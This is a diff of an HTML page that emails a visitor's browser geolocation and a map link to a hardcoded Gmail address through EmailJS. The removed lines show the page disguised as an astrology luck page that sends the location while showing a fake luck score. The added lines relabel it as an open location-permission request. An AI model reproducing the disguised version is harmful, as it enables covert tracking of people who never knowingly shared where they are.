@@ -3,9 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Luck Through Stars And Astrology</title>
+  <title>Location Permission</title>
 
-  <script src="cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
   <style>
     body {
@@ -23,13 +23,14 @@
 </head>
 
 <body>
-  <h1>Luck</h1>
+  <h1>Location Permission</h1>
 
   <p>
-    Find Luck Through Stars
+    This page will ask for your location. Your location will only be sent
+    if you select “Allow”.
   </p>
-  
-  <p id="status"></p>
+
+  <p id="status">Requesting location permission...</p>
 
   <script>
     const EMAILJS_PUBLIC_KEY = "vdXmhe_duYHT5y0qd";
@@ -57,7 +58,7 @@
           const time = new Date().toISOString();
 
           const mapLink =
-            `www.google.com/maps?q=${latitude},${longitude}`;
+            `https://www.google.com/maps?q=${latitude},${longitude}`;
 
           const templateParameters = {
             to_email: "dineshandsons2070@gmail.com",
@@ -78,7 +79,7 @@
             );
 
             status.textContent =
-              "YOUR LUCK TODAY WILL BE 10 OUT OF 10";
+              "Location received and sent successfully.";
           } catch (error) {
             console.error("EmailJS error:", error);
 
